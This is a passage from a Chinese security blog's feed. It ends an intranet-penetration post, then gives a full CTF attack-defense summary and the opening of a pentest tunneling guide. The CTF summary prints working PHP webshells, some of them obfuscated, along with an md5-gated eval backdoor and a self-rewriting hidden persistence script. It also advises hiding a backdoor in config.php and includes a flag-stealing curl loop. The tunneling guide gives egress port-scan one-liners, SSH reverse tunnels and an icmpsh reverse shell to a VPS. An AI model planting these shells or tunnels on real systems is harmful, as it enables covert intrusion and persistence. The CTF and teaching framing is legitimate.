<h2 id="做MIMT这块的两个工具"><a href="#做MIMT这块的两个工具" class="headerlink" title="做MIMT这块的两个工具"></a>做MIMT这块的两个工具</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">responder.py &amp;&amp;Invoke-Inveigh.ps1 ，经常被用来做信息收集。</div><div class="line">responder.py –A 分析模式</div></pre></td></tr></table></figure>
<h2 id="Powerview-ps1-域渗透利器"><a href="#Powerview-ps1-域渗透利器" class="headerlink" title="Powerview.ps1 域渗透利器"></a>Powerview.ps1 域渗透利器</h2><p>最后，如果攻击者终于拿到了域控了，要做的事就是信息获取，包括全域hash（mimikatz），ldap信息(csvde)，dns信息（dnscmd）等，碰到文件占用的情况还会使用卷影复制。</p>
<p>除此之外攻击者还可能利用域控干点其他事，例如当问权限设置严格，攻击者所在位置访问不了目标机器，甚至域控本机也访问不了，只能是目标单向访问的情况，例如攻击者找不到目标ip，这时攻击者就可以拿出域组策略GPO这个大杀器了，当然相对应的动静会偏大。</p>
<hr>
<p>整合参考：<br><a href="https://mp.weixin.qq.com/s?__biz=MzIxNTQxMjQyNg==&amp;mid=2247484247&amp;idx=1&amp;sn=ca9f7fd6ca95000b2b41b13a0a356ede&amp;chksm=9799f8f2a0ee71e44ca01c49c4f9d5a7e222e822608de9e27941272f445600e40e6c7406e94f&amp;mpshare=1&amp;scene=23&amp;srcid=06167UJn60EzUeiDU2pmwqk8#rd" target="_blank" rel="external">黑客游走于企业windows内网的几种姿势</a><br><a href="http://bobao.360.cn/learning/detail/3204.html" target="_blank" rel="external">内网渗透——网络环境的判断</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;内网渗透，最重要得是定位问题。所以前期的调研和收集是非常重要的一项工作。&lt;br&gt;标：本文多数内容是整合的知识点。&lt;br&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="http://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网" scheme="http://rcoil.me/tags/%E5%86%85%E7%BD%91/"/>
    
      <category term="Web安全" scheme="http://rcoil.me/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="系统安全" scheme="http://rcoil.me/tags/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
      <category term="后门" scheme="http://rcoil.me/tags/%E5%90%8E%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>CTF线下攻防赛总结</title>
    <link href="http://rcoil.me/2017/06/CTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93/"/>
    <id>http://rcoil.me/2017/06/CTF线下赛总结/</id>
    <published>2017-06-23T13:29:11.000Z</published>
    <updated>2017-09-07T12:42:52.036Z</updated>
    
    <content type="html"><![CDATA[<p>本着最后一次参加线下赛，这时间安排也是让人很无语。将这一份总结留给学弟他们，涨涨经验。<br><a id="more"></a></p>
<hr>
<p>一张常规的CTF线下攻防思维导图<br><img src="/image/CTF线下攻防赛.png" alt="CTF线下攻防思维导图"></p>
<h2 id="SSH登陆"><a href="#SSH登陆" class="headerlink" title="SSH登陆"></a>SSH登陆</h2><p>两三个人进行分工，一个粗略的看下web，有登陆口的话，就需要修改密码，将情况反馈给队友，让登陆ssh的小伙伴进行密码的修改，改成炒鸡复杂、然后将Web目录下载下来，上WAF、文件监控、端口扫描。将这几个工作分工好，顺序就像图上。</p>
<p>tips：将下载下来的Web目录理一遍，看是否有可疑的文件夹，比如<code>bak</code>。<br>依然记得有次比赛，有两台靶机，赛组提示弱口令。然后每一支队伍都奔着后台去了，结果有队伍在Web目录下发现了这个<code>bak</code>目录，打开发现是<code>phpmyadmin</code>，提示的弱口令是在这里用上。</p>
<h2 id="网络拓扑"><a href="#网络拓扑" class="headerlink" title="网络拓扑"></a>网络拓扑</h2><p>首先先理清好网络拓扑关系，节点与各链路之间的关联。这个需要下一步配合，要不然不知道对手在哪就GG。<br>示例：<br><img src="https://ooo.0o0.ooo/2017/06/15/5942aa87d34c8.png" alt="区二赛网络拓扑图"></p>
<h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p>如果是在同个C段，或者B段，均可以使用<code>RouterScan</code>进行对80端口扫描进行扫描得出，嫌麻烦的话，就用<a href="https://github.com/zer0h/httpscan" target="_blank" rel="external">httpscan</a>这个小巧的脚本</p>
<p>千万要记得扫端口，这很重要，当然这个端口扫描是建立在没有自己靶机权限的情况下。用nmap也行，自己写的脚本或者网上找的也行。</p>
<h2 id="预留后门"><a href="#预留后门" class="headerlink" title="预留后门"></a>预留后门</h2><p>有的比赛环境，为了照顾比较菜的选手（此处举手），预留了一句话后门。将整个web目录下载到本地，使用hm.exe、D盾或者别的扫描工具可以扫描得出（如果预留）</p>
<h2 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h2><p><img src="https://ooo.0o0.ooo/2017/06/15/5942334122fd9.png" alt="线下赛黑盒测试"></p>
<p>防御及修复建议<br>1.将所有的登陆口密码进行修改（炒鸡复杂）；<br>2.将上传页面的action地址修改为<code>*</code>，（机智小能手！！）；<br>3.反序列化和命令执行，就去seebug或其他的站点找补丁；<br>4.待补充…</p>
<h2 id="一句话"><a href="#一句话" class="headerlink" title="一句话"></a>一句话</h2><p>控制用的一句话木马，最好是需要菜刀配置的，这样做是为了不让别人轻易的利用你的一句话，要不然就只能等着别人用你的脚本捡分。<br>简单举例：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> ($_=@$_GET[<span class="number">2</span>]).@$_($_POST[<span class="number">1</span>])<span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>连接方式：php?2=assert密码是1。<br>献上我常用得一句话<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$a=chr(<span class="number">96</span>^<span class="number">5</span>);</div><div class="line">$b=chr(<span class="number">57</span>^<span class="number">79</span>);</div><div class="line">$c=chr(<span class="number">15</span>^<span class="number">110</span>);</div><div class="line">$d=chr(<span class="number">58</span>^<span class="number">86</span>);</div><div class="line">$e=<span class="string">'($_REQUEST[C])'</span>;</div><div class="line">@assert($a.$b.$c.$d.$e);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>配置为<code>?b=))99(rhC(tseuqeR+lave</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    $sF=<span class="string">"PCT4BA6ODSE_"</span>;$s21=strtolower($sF[<span class="number">4</span>].$sF[<span class="number">5</span>].$sF[<span class="number">9</span>].$sF[<span class="number">10</span>].$sF[<span class="number">6</span>].$sF[<span class="number">3</span>].$sF[<span class="number">11</span>].$sF[<span class="number">8</span>].$sF[<span class="number">10</span>].$sF[<span class="number">1</span>].$sF[<span class="number">7</span>].$sF[<span class="number">8</span>].$sF[<span class="number">10</span>]);$s22=$&#123;strtoupper($sF[<span class="number">11</span>].$sF[<span class="number">0</span>].$sF[<span class="number">7</span>].$sF[<span class="number">9</span>].$sF[<span class="number">2</span>])&#125;[<span class="string">'n985de9'</span>];<span class="keyword">if</span>(<span class="keyword">isset</span>($s22))&#123;<span class="keyword">eval</span>($s21($s22));&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>配置填<code>n985de9=QGV2YWwoJF9QT1NUWzBdKTs=</code><br>连接密码:0（零）</p>
<h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    set_time_limit(<span class="number">0</span>);</div><div class="line">    ignore_user_abort(<span class="keyword">true</span>);</div><div class="line"></div><div class="line">	$file = <span class="string">'.demo.php'</span>;</div><div class="line">	$shell = <span class="string">"&lt;?php phpinfo();?&gt;"</span>;</div><div class="line"></div><div class="line">    <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</div><div class="line">        file_put_contents($file, $shell);</div><div class="line">        system(<span class="string">'chmod 777 .demo.php'</span>);</div><div class="line"></div><div class="line">        usleep(<span class="number">50</span>);</div><div class="line">        &#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>tips:<code>.demo.php</code>前面使用一个点，能很好的隐藏文件。<br>想要结束这个进程，除了最暴力的重启服务之外，更为优雅的如下:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</div><div class="line">	$pid=<span class="number">1234</span>;</div><div class="line">	@unlink(<span class="string">'demo.php'</span>);</div><div class="line">	exec(<span class="string">'kill -9 $pid'</span>);</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>先查看进程，查看对应的pid，再执行即可。</p>
<p>素质低的人则会放置一个md5马，比如<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>(md5($_POST[<span class="string">'pass'</span>])==<span class="string">'d8d1a1efe0134e2530f503028a825253'</span>)</div><div class="line">@<span class="keyword">eval</span>($_POST[<span class="string">'cmd'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>如果素质低的人又很猥琐，像<a href="http://blog.163.com/passw0a_d/blog/static/2508070612017613113859691/" target="_blank" rel="external">rootrain</a>这种就是。那就是利用<code>header</code>，最后综合起来就是<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">echo</span> <span class="string">'hello'</span>;</div><div class="line">$test= <span class="string">'flag'</span>;</div><div class="line"><span class="keyword">if</span>(md5($_POST[<span class="string">'pass'</span>])==<span class="string">'d8d1a1efe0134e2530f503028a825253'</span>)</div><div class="line">	<span class="keyword">if</span> (@$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>] == <span class="string">'flag'</span>)&#123;</div><div class="line">    header(<span class="string">"flag:$test"</span>);</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>放进<code>config.php</code>效果最好，因为一般很少人去看这个。</p>
<h2 id="简单的维护"><a href="#简单的维护" class="headerlink" title="简单的维护"></a>简单的维护</h2><p>将<code>uploads</code>等文件夹使用<code>chattr</code>对文件底层属性进行控制。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">chattr命令的用法：chattr [ -RVf ] [ -v version ] [ mode ] files…</div><div class="line">最关键的是在[mode]部分，[mode]部分是由+-=和[ASacDdIijsTtu]这些字符组合的，这部分是用来控制文件的</div><div class="line">属性。</div><div class="line"></div><div class="line">+ ：在原有参数设定基础上，追加参数。</div><div class="line">- ：在原有参数设定基础上，移除参数。</div><div class="line">= ：更新为指定参数设定。</div><div class="line">A：文件或目录的 atime (access time)不可被修改(modified), 可以有效预防例如手提电脑磁盘I/O错误的发生。</div><div class="line">S：硬盘I/O同步选项，功能类似sync。</div><div class="line">a：即append，设定该参数后，只能向文件中添加数据，而不能删除，多用于服务器日志文件安全，只有root才能设定这个属性。</div><div class="line">c：即compresse，设定文件是否经压缩后再存储。读取时需要经过自动解压操作。</div><div class="line">d：即no dump，设定文件不能成为dump程序的备份目标。</div><div class="line">i：设定文件不能被删除、改名、设定链接关系，同时不能写入或新增内容。i参数对于文件 系统的安全设置有很大帮助。</div><div class="line">j：即journal，设定此参数使得当通过mount参数：data=ordered 或者 data=writeback 挂 载的文件系统，文件在写入时会先被记录(在journal中)。如果filesystem被设定参数为 data=journal，则该参数自动失效。</div><div class="line">s：保密性地删除文件或目录，即硬盘空间被全部收回。</div><div class="line">u：与s相反，当设定为u时，数据内容其实还存在磁盘中，可以用于undeletion。</div><div class="line">各参数选项中常用到的是a和i。a选项强制只可添加不可删除，多用于日志系统的安全设定。而i是更为严格的安全设定，只有superuser (root) 或具有CAP_LINUX_IMMUTABLE处理能力（标识）的进程能够施加该选项。</div><div class="line"></div><div class="line">应用举例：</div><div class="line"></div><div class="line">用chattr命令防止系统中某个关键文件被修改：</div><div class="line"># chattr +i /etc/resolv.conf</div></pre></td></tr></table></figure></p>
<h2 id="flag获取"><a href="#flag获取" class="headerlink" title="flag获取"></a>flag获取</h2><p>上面的<code>$shell</code>内容看个人，线下赛可以直接使用<code>&lt;?php echo system(&quot;curl 10.0.0.2&quot;); ?&gt;</code>之类的，只是说一个点，剩余的发挥空间由你们思考。</p>
<p>最好能写一个<a href="http://www.freebuf.com/sectool/91082.html" target="_blank" rel="external">批量上传</a>的，结合批量访问。批量访问参考<a href="http://rcoil.me/2017/05/PHP-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/">PHP-定时任务</a><br>或者<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line"><span class="keyword">while</span> <span class="literal">true</span></div><div class="line"><span class="keyword">do</span></div><div class="line">	flag=$(curl <span class="string">'http://172.16.4.42:800'</span>)</div><div class="line">	curl --cookie <span class="string">"PHPSESSID=21il7pum6i3781pumljhv578c1; xdgame_username=%E5%B0%8F%E7%BA%A2%E5%B8%BD"</span> --data <span class="string">"key="</span><span class="variable">$&#123;flag&#125;</span> <span class="string">"http://172.16.4.42/index.php/wargame/submit"</span></div><div class="line">	sleep 1s</div><div class="line"><span class="keyword">done</span></div></pre></td></tr></table></figure></p>
<p>只有想不到，没有做不到。</p>
<h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><h3 id="日志分析的用途"><a href="#日志分析的用途" class="headerlink" title="日志分析的用途"></a>日志分析的用途</h3><ol>
<li>感知可能正在发生的攻击，从而规避存在的安全风险</li>
<li>应急响应，还原攻击者的攻击路径，从而挽回已经造成的损失</li>
</ol>
<h3 id="记录log脚本"><a href="#记录log脚本" class="headerlink" title="记录log脚本"></a>记录log脚本</h3><p>这种脚本网上有很多。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">date_default_timezone_set(<span class="string">'Asia/Shanghai'</span>);</div><div class="line">$ip       = $_SERVER[<span class="string">"REMOTE_ADDR"</span>]; <span class="comment">//记录访问者的ip</span></div><div class="line">$filename = $_SERVER[<span class="string">'PHP_SELF'</span>];	<span class="comment">//访问者要访问的文件名</span></div><div class="line">$parameter   = $_SERVER[<span class="string">"QUERY_STRING"</span>]; <span class="comment">//访问者要请求的参数</span></div><div class="line">$time     =   date(<span class="string">'Y-m-d H:i:s'</span>,time()); <span class="comment">//访问时间</span></div><div class="line">$logadd = <span class="string">'来访时间：'</span>.$time.<span class="string">'--&gt;'</span>.<span class="string">'访问链接：'</span>.<span class="string">'http://'</span>.$ip.$filename.<span class="string">'?'</span>.$parameter.<span class="string">"\r\n"</span>;</div><div class="line"></div><div class="line"><span class="comment">// log记录</span></div><div class="line">$fh = fopen(<span class="string">"log.txt"</span>, <span class="string">"a"</span>);</div><div class="line">fwrite($fh, $logadd);</div><div class="line">fclose($fh);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<h3 id="日志分析工具"><a href="#日志分析工具" class="headerlink" title="日志分析工具"></a>日志分析工具</h3><ol>
<li>LogForensics 腾讯实验室<br><a href="https://security.tencent.com/index.php/opensource/detail/15" target="_blank" rel="external">https://security.tencent.com/index.php/opensource/detail/15</a></li>
<li>北风飘然@金乌网络安全实验室<br><a href="http://www.freebuf.com/sectool/126698.html" target="_blank" rel="external">http://www.freebuf.com/sectool/126698.html</a></li>
<li>网络ID为piaox的安全从业人员：<br><a href="http://www.freebuf.com/sectool/110644.html" target="_blank" rel="external">http://www.freebuf.com/sectool/110644.html</a></li>
<li>网络ID：SecSky<br><a href="http://www.freebuf.com/sectool/8982.html" target="_blank" rel="external">http://www.freebuf.com/sectool/8982.html</a></li>
<li>网络ID：鬼魅羊羔<br><a href="http://www.freebuf.com/articles/web/96675.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/96675.html</a></li>
</ol>
<h2 id="CTF总结"><a href="#CTF总结" class="headerlink" title="CTF总结"></a>CTF总结</h2><h3 id="意义所在"><a href="#意义所在" class="headerlink" title="意义所在"></a>意义所在</h3><p>首先，CTF题是信息安全得基本概念，攻防技术、技巧得浓缩和提炼。通过解题，会快速掌握题目中所包含得概念和技术点，而这些知识在真实得环境中可能比较分散，难以学习，高水平得CTF都是由业内专家命题，往往凝聚着他们多年积累出来的技能。</p>
<p>其次，CTF题注重实际操作，并与基础理论知识相结合。每道CTF都需要实际动手才能找到答案，并且在比赛中经常要拼速度，这对攻防操作得能力会有极高的锻炼。除此之外，高质量得CTF题都没法直接使用现成工具解出，一般需要在理解基本原理的基础上，自己编写代码来求解，这个过程会加深和巩固计算机基础知识得理解。</p>
<p>最后，CTF能够给不能层次的人在技术上带来提高。没有网络信息安全基础的学生通过CTF，建立了安全攻防的概念；有初步基础的学生，通过高质量赛题的实践练习，提升了实战能力；已经学有所成的学生，通过国际CTF大赛和国际强队比拼，开阔了视野。</p>
<h3 id="不要为CTF而CTF"><a href="#不要为CTF而CTF" class="headerlink" title="不要为CTF而CTF"></a>不要为CTF而CTF</h3><p>虽然ctf涉及到的知识点面非常的全面。但是在实际应用中，在自己所选择的方向上给予不了多大的帮助。<br>只因为CTF环境太过于理想化（当然是我水平问题，做不来大的CTF赛题），因为总有方法可以拿到flag，在实操上，遇到瓶颈，要考虑的东西就多了。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本着最后一次参加线下赛，这时间安排也是让人很无语。将这一份总结留给学弟他们，涨涨经验。&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://rcoil.me/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://rcoil.me/tags/CTF/"/>
    
      <category term="Writeup" scheme="http://rcoil.me/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试 之 代理篇</title>
    <link href="http://rcoil.me/2017/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B9%8B-%E4%BB%A3%E7%90%86%E7%AF%87/"/>
    <id>http://rcoil.me/2017/06/渗透测试-之-代理篇/</id>
    <published>2017-06-10T15:33:55.000Z</published>
    <updated>2017-09-08T11:52:17.224Z</updated>
    
    <content type="html"><![CDATA[<p>整合个端口、代理总结，总觉得好难。慢慢来…<br><a id="more"></a></p>
<hr>
<p>适用网络环境有以下几种：</p>
<ol>
<li>服务器处于内网，可以访问外部网络。</li>
<li>服务器处于外网，可以访问外部网络，但是服务器安装了防火墙来拒绝敏感端口的连接。</li>
<li>服务器处于内网，对外只开放了80端口，并且服务器不能访问外网网络。</li>
</ol>
<p>对于以上三种情况，传统的方法可以突破1和2二种（全都可以理解为lcx），第3种可以使用SOCKS代理。<br><img src="/image/代理小技巧.png" alt="代理小技巧"></p>
<h1 id="判断什么端口能出来"><a href="#判断什么端口能出来" class="headerlink" title="判断什么端口能出来"></a>判断什么端口能出来</h1><h2 id="VISTA-以下"><a href="#VISTA-以下" class="headerlink" title="VISTA 以下"></a>VISTA 以下</h2><ul>
<li>TCP<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FOR /L %i IN (1,1,65535) DO (cmd /c &quot;start /b telnet 151.101.73.147 %i&quot;)</div></pre></td></tr></table></figure>
</li>
</ul>
<p>用 <code>TELNET</code> 不停的连接你的 <code>1-65535</code> 端口, 你本地开个 <code>TCPDUMP</code> 就行了, 如果连通了, 就 OK 。</p>
<ul>
<li>UDP<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FOR /L %i IN (1,1,65535) DO (cmd /c &quot;start /b nslookup -port=%i rcoil.me 151.101.73.147&quot;)</div></pre></td></tr></table></figure>
</li>
</ul>
<p>这个速度慢，但是有效。</p>
<h2 id="VISTA-以后"><a href="#VISTA-以后" class="headerlink" title="VISTA 以后"></a>VISTA 以后</h2><ul>
<li><p>TCP</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">function sT($IP,$Port) &#123;$Address = [system.net.IPAddress]::Parse($IP);$End = New-Object System.Net.IPEndPoint $address, $port;$Saddrf = [System.Net.Sockets.AddressFamily]::InterNetwork;$Stype = [System.Net.Sockets.SocketType]::Stream;$Ptype = [System.Net.Sockets.ProtocolType]::TCP;$Sock = New-Object System.Net.Sockets.Socket $saddrf, $stype, $ptype;$Sock.TTL = 26;try &#123; $sock.Connect($End);[Byte[]] $Message = [char[]]&quot;w00tw00t&quot;;$Sent = $Sock.Send($Message);$sock.EndConnect($Connect)&#125; catch &#123;&#125;;$Sock.Close();&#125;;1..65535 | %&#123; sT -IP &quot;151.101.73.147&quot; -Port $_ &#125;</div></pre></td></tr></table></figure>
</li>
<li><p>UDP</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">function sU($IP, [int]$Port)&#123;$Address = [system.net.IPAddress]::Parse($IP);$End = New-Object System.Net.IPEndPoint($Address, $port);$Saddrf=[System.Net.Sockets.AddressFamily]::InterNetwork;$Stype=[System.Net.Sockets.SocketType]::Dgram;$Ptype=[System.Net.Sockets.ProtocolType]::UDP;$Sock=New-Object System.Net.Sockets.Socket $saddrf, $stype, $ptype;$Sock.TTL = 26;$sock.Connect($end);$Enc=[System.Text.Encoding]::ASCII;$Message = &quot;w00tw00t&quot;;$Buffer=$Enc.GetBytes($Message);$Sent=$Sock.Send($Buffer);&#125;; 1..65535 | %&#123; sU -IP &quot;151.101.73.147&quot; -Port $_ &#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<h1 id="SSH隧道"><a href="#SSH隧道" class="headerlink" title="SSH隧道"></a>SSH隧道</h1><p>编辑<code>/etc/ssh/sshd_config</code>文件（服务器端）中：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">GatewayPorts yes</div><div class="line">PermitRootLogin yes</div><div class="line">PermitTunnel yes #Tunnel启用</div><div class="line">ClientAliveInterval 60 #指定了服务器端向客户端请求消息的时间间隔,</div><div class="line">ClientAliveCountMax 3 #请求后客户端没有响应的次数达到3次, 就自动断开</div></pre></td></tr></table></figure></p>
<p>接着重启ssh服务</p>
<p>参数详解：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">-q Quiet mode. 安静模式</div><div class="line">-T Disable pseudo-tty allocation. 不占用 shell 了</div><div class="line">-N：Do not execute a remote command. 不执行远程命令，端口转发就用它了～</div><div class="line">-C：该参数将使ssh压缩所有通过Secure Shell客户端发送的数据，包括输入、输出、错误消息及转发数据。它使用gzip算法，压缩级别可通过设置配制文件中的参数Compressicn Level来指定。这对于缓慢的传输线路特别有用的。但对于传输速度已经很快的网络则显得没有必要。同样，你可以利用配制文件针对每台主机配置这个参数。</div><div class="line">-f：该参数将ssh连接送入后台执行。这在验证已经完成且TCP/IP转发已经建立的情况下会生效。这对在远程主机上启动X程序显得十分重要。其后用户将被提示要求输入口令(提供的认证代理不运行)，然后将连接送往后台。并推荐加上 -n 参数</div><div class="line">-g：该参数允许远程主机通过端口转发与主机端口相连，通常情况下仅允许本地主机这样做。</div><div class="line">-R：远程转发</div><div class="line">-L：本地转发</div><div class="line">-D：...</div></pre></td></tr></table></figure></p>
<h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ssh -qTfnN -L port:host:hostport -l user remote_ip #正向隧道，本地访问VPS:8080就是VPS内网的22端口</div><div class="line">ssh -qTfnN -R port:host:hostport -l user remote_ip #反向隧道，用于内网穿透防火墙限制之类</div></pre></td></tr></table></figure>
<p>举个例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh -N -R 5556:192.168.2.100:5556 username@host</div></pre></td></tr></table></figure></p>
<p>msf监听5556端口就可以了。</p>
<h2 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">SSH -qTfnN -D port remotehost #直接进行socks代理</div><div class="line">ssh -qTfnN -D 6080 user@theserver #在本地终端中运行 </div><div class="line">然后在浏览器或者软件中设置好代理参数 </div><div class="line">socks5: 127.0.0.1:6080 后便可以使用.</div><div class="line">-q：静默运行</div></pre></td></tr></table></figure>
<h2 id="远程转发-反向"><a href="#远程转发-反向" class="headerlink" title="远程转发(反向)"></a>远程转发(反向)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">第一步：</div><div class="line">sudo python -m SimpleHTTPServer 80</div><div class="line">在目标机子开启80端口服务</div><div class="line">第二步：</div><div class="line">ssh -p 22 -qngfNTR 6666:localhost:22 VPS-user@VPS</div><div class="line">这样就把目标本地的22端口转发到了远程机器（VPS）的6666端口</div><div class="line">第三步：</div><div class="line">个人PC机器直接使用语句:</div><div class="line">ssh -p 6666 -qngfNTD 6767 内网用户@VPS</div><div class="line">这样就可以直接穿透网络，进入到内网，本地机器直接使用SOCKS5代理127.0.0.1:6767便能够直接访问到目标内网当中</div></pre></td></tr></table></figure>
<h1 id="ICMP隧道"><a href="#ICMP隧道" class="headerlink" title="ICMP隧道"></a>ICMP隧道</h1><p><code>ICMP隧道</code>是通过将任意数据注入发送到远程计算机的回送数据包来工作的。要判断是否能使用ICMP隧道，我们只需要关注一件事情：可以ping一个外部服务器。如果能到达外部网络，，那么很有可能可以建立一个icmp隧道。缺点是需要<code>root/administrator</code>权限。</p>
<h2 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h2><p>vps上：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/inquisb/icmpsh.git</div><div class="line">apt-get install python-impacket</div><div class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1</div><div class="line">python icmpsh_m.py 39.xxx.xxx.17 182.xxx.xxx.207</div></pre></td></tr></table></figure></p>
<p>靶机上：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">icmpsh.exe -t 39.xxx.xxx.17 -d 500 -b 30 -s 128</div></pre></td></tr></table></figure></p>
<p>就会在vps上接到一个cmdshell。</p>
